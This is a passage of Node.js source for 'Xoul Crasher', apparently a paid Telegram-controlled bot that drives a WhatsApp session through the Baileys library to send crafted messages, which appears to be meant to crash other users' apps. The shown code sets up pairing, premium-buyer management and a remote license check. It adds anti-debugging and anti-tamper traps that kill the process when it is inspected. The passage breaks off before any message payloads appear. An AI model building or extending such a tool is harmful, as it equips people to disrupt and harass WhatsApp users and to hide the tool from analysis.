const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
  default: makeWASocket,
  useMultiFileAuthState,
  fetchLatestBaileysVersion,
  generateWAMessageFromContent,
  prepareWAMessageMedia,
  downloadContentFromMessage,
  generateForwardMessageContent,
  generateWAMessage,
  jidDecode,
  areJidsSameUser,
  BufferJSON,
  DisconnectReason,
  proto,
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const databaseUrl = 'https://raw.githubusercontent.com/qiffdatabase/Database/main/asketuparbo.json';
const thumbnailUrl = "https://files.catbox.moe/f2elg2.jpg";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: Bot Connected
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: No Access
  
  Perubahan kode terdeteksi, Harap membeli script kepada reseller
  yang tersedia dan legal
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: No Access
  
  Token tidak terdaftar, Mohon membeli akses kepada reseller yang tersedia
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: No Access
  
  Gagal menghubungkan ke server, Akses ditolak
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣟⠟⠋⢡⡎⢿⢿⠳⡕⢤⡉⡷⡽⠁
⣧⢮⢭⠛⢲⣦⣀⠀⠀⠀⠠⡀⠀⠀⠀⡾⣥⣏⣖⡟⠸⢺⠀⠀⠈⠙⠋⠁⠀⠀
⠈⠻⣶⡛⠲⣄⠀⠙⠢⣀⠀⢇⠀⠀⠀⠘⠿⣯⣮⢦⠶⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢻⣿⣥⡬⠽⠶⠤⣌⣣⣼⡔⠊⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢠⣿⣧⣤⡴⢤⡴⣶⣿⣟⢯⡙⠒⠤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣗⣞⣢⡟⢋⢜⣿⠛⡿⡄⢻⡮⣄⠈⠳⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠻⠮⠴⠵⢋⣇⡇⣷⢳⡀⢱⡈⢋⠛⣄⣹⣲⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣱⡇⣦⢾⣾⠿⠟⠿⠷⠷⣻⠧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⠽⠞⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

╰➤ INFORMATION:
 ▢ Developer: @fuckyoubre
 ▢ Version: 7.0 Beta
 ▢ Status: Bot Connected
  `))
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Netrality',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `<blockquote>
#- 𝗫𝗼𝘂𝗹 𝗖𝗿𝗮𝘀𝗵𝗲𝗿

▢ Number: ${lastPairingMessage.phoneNumber}
▢ Pairing Code: ${lastPairingMessage.pairingCode}
▢ Type: Connected
</blockquote>`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.yellow(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢔⣶⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠗⡿⣾⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠓⡞⢩⣯⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠰⡹⠁⢰⠃⣩⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣿⠿⣉⣩⠛⠲⢶⡠⢄⠐⣣⠃⣰⠗⠋⢀⣯⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣯⣠⠬⠦⢤⣀⠈⠓⢽⣾⢔⣡⡴⠞⠻⠙⢳⡄
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣵⣳⠖⠉⠉⢉⣩⣵⣿⣿⣒⢤⣴⠤⠽⣬⡇
